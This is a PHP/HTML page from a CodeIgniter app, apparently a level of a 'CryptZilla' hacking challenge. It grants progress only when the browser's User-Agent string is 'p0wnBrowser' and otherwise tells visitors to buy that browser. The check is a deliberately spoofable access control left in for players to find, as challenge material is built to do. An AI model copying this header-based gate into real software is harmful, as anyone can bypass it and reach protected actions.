<?php
	$this->load->helper('url');
	$this->load->model('status');
	$this->load->library('user_agent');
	$agent = $this->agent->agent_string();
	if($agent=='p0wnBrowser'){
		$this->status->setStatus($id,$level);
		redirect('welcome/update');
	}
?>
<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1253">
<title>CryptZilla</title>
<style type="text/css">
.style2 {
	font-size: xx-large;
	color: #0000FF;
}
.style3 {
	color: #808000;
}
</style>
<center>
<body bgcolor="black">
<img src="<?php echo base_url(''); ?>images/pawn.png">
<font color="green">

</head>


<h2><br><br>Unfortunately, you cannot access the contents of this site...<br>
In order to do this, you must buy p0wnBrowser. It only costs USD $350.
</html>

